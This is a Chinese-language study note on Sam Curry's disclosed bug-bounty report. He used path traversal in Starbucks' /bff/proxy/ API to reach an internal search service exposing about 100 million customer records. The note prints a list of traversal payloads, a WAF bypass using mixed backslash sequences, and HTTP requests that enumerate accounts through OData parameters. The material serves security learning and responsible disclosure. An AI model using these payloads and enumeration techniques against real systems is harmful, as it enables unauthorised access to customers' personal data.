# 2023-05-04：筆記 samcurry 的 Hacking Starbucks and Accessing Nearly 100 Million Customer Records.md
## samcurry (samwcyo), June 20, 2020
### https://samcurry.net/hacking-starbucks/


----------------

一篇 samcurry 的舊 blog，這種攻擊方式大致上被叫做 `Attacking Secondary Contexts in Web Applications`  

samcurry 有 talk 談過這個問題: [https://www.youtube.com/watch?v=hWmXEAi9z5w](https://www.youtube.com/watch?v=hWmXEAi9z5w)

----------------


經過一天漫長的嘗試和失敗，我決定退出 Verizon Media 的 bug bounty program，並做一些雜事
- 我需要為一個朋友的生日買禮物，於是上網訂購了一張星巴克禮品卡

當我試圖在星巴克網站上購買時，我不禁注意到有很多 API call，感覺很可疑
- 在一個前綴為 `/bff/proxy/` 的 API 下發送的請求，返回的 data **似乎來自另一個主機**

由於星巴克有 bug bounty program，而且我對那天的零進展感到有點失望，我決定進一步探索它們  

下面是這些 API 的一個例子，它返回我的用戶資料：
```
POST /bff/proxy/orchestra/get-user HTTP/1.1
Host: app.starbucks.com
```

```json
{
  "data": {
    "user": {
      "exId": "77EFFC83-7EE9-4ECA-9049-A6A23BF1830F",
      "firstName": "Sam",
      "lastName": "Curry",
      "email": "samwcurry@gmail.com",
      "partnerNumber": null,
      "birthDay": null,
      "birthMonth": null,
      "loyaltyProgram": null
    }
  }
}
```

這邊所謂的 `bff` 實際上是 `Backend for Frontend` 的意思
- 表示 User 與之交互的 application 將請求傳遞給另一個主機以實現實際邏輯或功能

下面是一個真正快速的、過於簡化的圖，它可能看起來像：  
![](https://samcurry.net/wp-content/uploads/2020/06/download.png)  


在上面的例子中
- `app.starbucks.com` 主機不能訪問正在被訪問的特定終端的邏輯或資料
- 但將作為代理或中間人來訪問假設的第二個主機，`internal.starbucks.com`


**這裡需要考慮的一些有趣的事情是**：
- 我們如何測試 app 的 routing (路由)？
- 如果 app 將請求路由到內部主機，那麼權限模型是什麼樣子的？
- 我們能否控制發送到內部主機的請求的路徑或參數？
- 內部主機上是否有一個開放的 redirect，如果有的話，app 是否會跟隨開放的 redirect？
- 返回的內容是否必須符合適當的類型（是解析 JSON, XML, 還是任何其他 data？）


**我做的第一件事**是
- 嘗試從 API call 中穿越出來
- 這樣我就可以加載其他路徑

我這樣做的方式是發送以下有效 payload：
```
/bff/proxy/orchestra/get-user/..%2f
/bff/proxy/orchestra/get-user/..;/
/bff/proxy/orchestra/get-user/../
/bff/proxy/orchestra/get-user/..%00/
/bff/proxy/orchestra/get-user/..%0d/
/bff/proxy/orchestra/get-user/..%5c
/bff/proxy/orchestra/get-user/..\
/bff/proxy/orchestra/get-user/..%ff/
/bff/proxy/orchestra/get-user/%2e%2e%2f
/bff/proxy/orchestra/get-user/.%2e/
/bff/proxy/orchestra/get-user/%3f (?)
/bff/proxy/orchestra/get-user/%26 (&)
/bff/proxy/orchestra/get-user/%23 (#)
```

可惜的是，這些都沒有用
- 都返回了我通常看到的 404 頁面，即試圖加載一個網站上不存在的頁面

**這表明**:
- 僅僅因為請求中的路徑是在 `/bff/proxy` 下，**它並沒有繼承我之後發送的所有內容。它可能是更明確的**


在這種情況下
- 我們可以把 `/bff/proxy/orchestra/get-user` 看作是一個不接受用戶輸入的 function
- 我們有可能找到一個接受用戶輸入的 function，比如 `/bff/proxy/users/:id`
  - (在那裡我們有空間來玩，測試它能接受什麼數據。)
- **如果我們能找到這樣的 API call，我們可能會有更多的運氣去嘗試遍歷有效 payload 和發送其他 data，因為它確實接受了用戶輸入**

我在 application 周圍看了一會兒
- 直到我發現了另外幾個 API call

我發現的第一個接受用戶輸入的 API call 是以下內容：
```
GET /bff/proxy/stream/v1/me/streamItems/:streamItemId HTTP/1.1
Host: app.starbucks.com
```


這 endpoint 與 `get-user` endpoint 不同
- 因為最後的路徑是作為一個參數存在的，我們提供任意的輸入
- 如果這個輸入被當作內部系統的一個路徑來處理，那麼我們就有可能穿越它並訪問其他內部 endpoint

幸運的是，**我嘗試的第一個測試返回了一個非常好的指標，表明我們可以遍歷 endpoint**：

```
GET /bff/proxy/stream/v1/users/me/streamItems/..\ HTTP/1.1
Host: app.starbucks.com
```

```
{
  "errors": [
    {
      "message": "Not Found",
      "errorCode": 404,
      ...

```


這個 JSON response 與 `/bff/proxy` 下的其他所有正常 API call 的 JSON response 相同
- 這表明，**我們打到了內部系統，並成功地修改了我們的對話路徑**

下一步是繪製內部系統圖
- **最好的方法是通過識別第一個返回 `400 bad request` 的路徑，向下追踪到根**

不幸的是，我遇到了一個小障礙。有個 `WAF` 不允許我深入到 two directories deep：
```
GET /bff/proxy/stream/v1/users/me/streamItems/..\..\ HTTP/1.1
Host: app.starbucks.com
```

```
HTTP/1.1 403 Forbidden
```

Luckily, `WAFs` are pretty terrible:

```
GET /bff/proxy/stream/v1/me/streamItems/web\..\.\..\ HTTP/1.1
Host: app.starbucks.com
```

```
{
  "errors": [
    {
      "message": "Not Found",
      "errorCode": 404,
      ...
```


最終，going 7 paths back 後，我收到了以下錯誤：
```
GET /bff/proxy/stream/v1/me/streamItems/web\..\.\..\.\..\.\..\.\..\.\..\.\..\ HTTP/1.1
Host: app.starbucks.com
```

```
{
  "errors": [
    {
      "message": "Bad Request",
      "errorCode": 400,
      ...

```


這意味著
- 內部 API 的 **root** 將在 6 個路徑之後
- 我們可以使用目錄暴力工具或只是 Burp Suite 的 `intruder` 者和 word list 來 map 它。

在這一點上，我聯繫了 Justin Gardner，讓他和我一起探討這個問題，因為我對這個功能非常感興趣
- 他幾乎立即確定了內部系統 root 的一些路徑

通過觀察對這些路徑的 HTTP 請求，如果沒有之後的正斜杠(forward slash)，就會使用 Burp 的 `intruder` 返回 redirect code：  
```
GET /bff/proxy/stream/v1/users/me/streamItems/web\..\.\..\.\..\.\..\.\..\.\..\.\search
Host: app.starbucks.com
```

```
HTTP/1.1 301 Moved Permanently
Server: nginx
Content-Type: text/html
Content-Length: 162
Location: /search/

```


當 Justin 努力尋找所有的 endpoints 時
- 我專注於每個目錄的逐一掃描
- 經過我自己的掃描，我發現 `v1` 存在於 `search` 下，`v1` 下面是 `Accounts` 和 `Addresses`

我跟 Justin 說，想到如果 `/search/v1/accounts` endpoints 是搜尋所有 production accounts，那將是多麼熱鬧的事情啊  
![](https://samcurry.net/wp-content/uploads/2020/06/user_accounts.png)  

這正是它(API)的主要功能    


`/search/v1/accounts` 是個 [Microsoft Graph](https://learn.microsoft.com/en-us/graph/overview) instance
- 可以訪問所有星巴克賬戶

![](https://samcurry.net/wp-content/uploads/2020/06/omg.png)  


```
GET /bff/proxy/stream/v1/users/me/streamItems/web\..\.\..\.\..\.\..\.\..\.\..\.\search\v1\Accounts\ HTTP/1.1
Host: app.starbucks.com
```

```
{
  "@odata.context": "https://redacted.starbucks.com/Search/v1/$metadata#Accounts",
  "value": [
    {
      "Id": 1,
      "ExternalId": "12345",
      "UserName": "UserName",
      "FirstName": "FirstName",
      "LastName": "LastName",
      "EmailAddress": "0640DE@example.com",
      "Submarket": "US",
      "PartnerNumber": null,
      "RegistrationDate": "1900-01-01T00:00:00Z",
      "RegistrationSource": "iOSApp",
      "LastUpdated": "2017-06-01T15:32:56.4925207Z"
    },
...
lots of production accounts

```


此外，`Addresses` 返回類似的東西：  

```
GET /bff/proxy/stream/v1/users/me/streamItems/web\..\.\..\.\..\.\..\.\..\.\..\.\search\v1\Addresses\ HTTP/1.1
Host: app.starbucks.com
```

```
{
  "@odata.context": "https://redacted.starbucks.com/Search/v1/$metadata#Addresses",
  "value": [
    {
      "Id": 1,
      "AccountId": 1,
      "AddressType": "3",
      "AddressLine1": null,
      "AddressLine2": null,
      "AddressLine3": null,
      "City": null,
      "PostalCode": null,
      "Country": null,
      "CountrySubdivision": null,
      "FirstName": null,
      "LastName": null,
      "PhoneNumber": null
    },
...
lots of production addresses

```



這個看起來是 production accounts 和 addresses 的服務
- 我們開始進一步探索該服務，以證實我們的懷疑，使用 Microsoft Graph 功能。

![](https://samcurry.net/wp-content/uploads/2020/06/filter_data.png)  

```
GET /bff/proxy/stream/v1/users/me/streamItems/web\..\.\..\.\..\.\..\.\..\.\..\.\Search\v1\Accounts?$count=true
Host: app.starbucks.com

```

```json
{
  "@odata.context": "https://redacted.starbucks.com/Search/v1/$metadata#Accounts",
  "@odata.count":99356059
}
```


通過加 Microsoft Graph URL 的`$count`參數
- 我們可以確定該服務有近 1 億條記錄
- 攻擊者可以通過加 `$skip` 和 `$count` 等參數來竊取這些資料，以列舉所有用戶 account

此外，為了確定一個特定的用戶 account，攻擊者可以使用 `$filter` 參數：

```
GET /bff/proxy/stream/v1/users/me/streamItems/web\..\.\..\.\..\.\..\.\..\.\..\.\Search\v1\Accounts?$filter=startswith(UserName,'redacted') HTTP/1.1
Host: app.starbucks.com
```

```json
{
  "@odata.context": "https://redacted.starbucks.com/Search/v1/$metadata#Accounts",
  "value": [
    {
      "Id": 81763022,
      "ExternalId": "59d159e2-redacted-redacted-b037-e8cececdf354",
      "UserName": "redacted@gmail.com",
      "FirstName": "Justin",
      "LastName": "Gardner",
      "EmailAddress": "redacted@gmail.com",
      "Submarket": "US",
      "PartnerNumber": null,
      "RegistrationDate": "2018-05-19T18:52:15.0763564Z",
      "RegistrationSource": "Android",
      "LastUpdated": "2020-05-16T23:28:39.3426069Z"
    }
  ]
}

```

由於一切的敏感性質
- 我們報告了這個問題。還有一些可能被訪問的 API

我們沒有時間去探索。我們發現的其他一些 endpoints 是
```
barcode, loyalty, appsettings, card, challenge, content, identifier, identity, onboarding, orderhistory, permissions, product, promotion, account, billingaddress, enrollment, location, music, offers, rewards, keyserver
```


這些其他的內部 endpoints 很可能（儘管沒有得到證實）允許我們訪問和修改賬單地址、禮品卡、獎勵和優惠等內容
- 我們目前的 pow 我們可以訪問近 1 億星巴克顧客的姓名、電子郵件、電話號碼和地址
- 星巴克團隊非常迅速地解決了這個問題，並在一天內修復了它

## Summary
- `app.starbucks.com` 上的 `/bff/proxy/` 下的 endpoints 在內部路由 retrieve and store data
- 有可能穿越這些 API call，找到不應該在內部主機上訪問的 URL
- 內部 API 有一個暴露的 Microsoft Graph instance，這將允許攻擊者滲出近 1 億條用戶記錄，包括姓名、電子郵件、電話號碼和地址

## Timeline
- Reported May 16th
- Patched May 17th
- Bounty awarded May 19th ($4,000)
- Disclosed June 16th